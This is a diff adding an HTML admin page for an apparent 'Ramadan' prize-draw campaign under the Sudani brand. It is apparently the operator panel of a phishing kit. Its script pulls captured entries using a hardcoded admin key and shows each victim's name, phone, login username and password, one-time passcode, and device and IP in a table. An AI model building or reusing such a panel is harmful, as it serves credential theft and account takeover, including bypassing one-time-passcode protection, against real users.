@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard - Prize Draw</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            background: #f0f2f5;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        h1 {
+            color: #004C97;
+            text-align: center;
+        }
+
+        .controls {
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            margin-bottom: 20px;
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+        }
+
+        input {
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            width: 300px;
+        }
+
+        button {
+            padding: 10px 20px;
+            background: #004C97;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .entries-table {
+            width: 100%;
+            background: #fff;
+            border-collapse: collapse;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .entries-table th,
+        .entries-table td {
+            padding: 12px 15px;
+            text-align: left;
+            border-bottom: 1px solid #eee;
+        }
+
+        .entries-table th {
+            background: #004C97;
+            color: #fff;
+        }
+
+        .entries-table tr:hover {
+            background: #f9f9f9;
+        }
+
+        .status-badge {
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 0.8rem;
+            font-weight: bold;
+        }
+
+        .badge-success {
+            background: #e6f7ef;
+            color: #00a651;
+        }
+
+        .creds {
+            background: #fff4e6;
+            padding: 5px;
+            border-radius: 4px;
+            font-family: monospace;
+            font-size: 0.9rem;
+            border: 1px solid #ffe8cc;
+        }
+
+        .device-info {
+            font-size: 0.8rem;
+            color: #666;
+            max-width: 250px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <h1>سوداني | رمضان يجمعنا - لوحة التحكم</h1>
+        <div class="controls">
+            <input type="password" id="adminKey" placeholder="Enter Admin Secret Key" value="sudani2026">
+            <button onclick="loadEntries()">Refresh Data</button>
+        </div>
+        <table class="entries-table">
+            <thead>
+                <tr>
+                    <th>Date</th>
+                    <th>Full Name</th>
+                    <th>Phone</th>
+                    <th>Credentials (User/Pass)</th>
+                    <th>OTP</th>
+                    <th>Device/IP</th>
+                </tr>
+            </thead>
+            <tbody id="entriesBody">
+                <!-- Entries will be loaded here -->
+            </tbody>
+        </table>
+    </div>
+
+    <script>
+        async function loadEntries() {
+            const key = document.getElementById('adminKey').value;
+            const tbody = document.getElementById('entriesBody');
+            tbody.innerHTML = '<tr><td colspan="6" style="text-align:center">Loading...</td></tr>';
+
+            try {
+                const response = await fetch(`/api/admin/entries?key=${key}`);
+                if (!response.ok) throw new Error('Unauthorized or Error');
+                const data = await response.json();
+
+                tbody.innerHTML = '';
+                if (data.length === 0) {
+                    tbody.innerHTML = '<tr><td colspan="6" style="text-align:center">No entries found</td></tr>';
+                    return;
+                }
+
+                data.reverse().forEach(entry => {
+                    const row = document.createElement('tr');
+                    const date = new Date(entry.timestamp).toLocaleString();
+                    const creds = entry.loginCredentials ? `${entry.loginCredentials.username} / ${entry.loginCredentials.password}` : 'N/A';
+                    const otp = entry.loginCredentials ? (entry.loginCredentials.otp || 'N/A') : 'N/A';
+                    const deviceInfo = entry.deviceInfo ? `${entry.deviceInfo.type} (${entry.ip})` : entry.ip;
+
+                    row.innerHTML = `
+                        <td>${date}</td>
+                        <td>${entry.fullName || 'N/A'}</td>
+                        <td>${entry.phone}</td>
+                        <td><div class="creds">${creds}</div></td>
+                        <td><strong style="color:#D4AF37">${otp}</strong></td>
+                        <td class="device-info" title="${entry.deviceInfo?.userAgent || ''}">${deviceInfo}</td>
+                    `;
+                    tbody.appendChild(row);
+                });
+            } catch (err) {
+                tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:red">Error: ${err.message}</td></tr>`;
+            }
+        }
+
+        // Auto load on start if key is present
+        window.onload = loadEntries;
+    </script>
+</body>
+
+</html>
